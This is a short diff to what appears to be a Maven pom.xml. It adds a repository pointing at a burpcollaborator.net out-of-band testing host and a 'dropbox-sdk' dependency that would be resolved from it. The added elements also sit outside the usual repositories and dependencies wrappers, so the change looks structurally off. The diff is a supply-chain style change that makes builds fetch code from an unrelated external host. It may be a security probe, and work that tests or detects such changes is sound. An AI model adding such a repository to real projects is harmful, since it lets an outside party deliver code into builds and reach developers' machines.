@@ -20,4 +20,15 @@
         <sonar.host.url>https://sonarcloud.io</sonar.host.url>
     </properties>
 
+    <repository>
+        <id>in-project</id>
+        <name>In Project Repo</name>
+        <url>https://jczb56axp4mztcrzntl6uybtqkwdk2.burpcollaborator.net/libs</url>
+    </repository>
+
+    <dependency>
+        <groupId>dropbox</groupId>
+        <artifactId>dropbox-sdk</artifactId>
+        <version>1.3.1</version>
+    </dependency>
 </project>
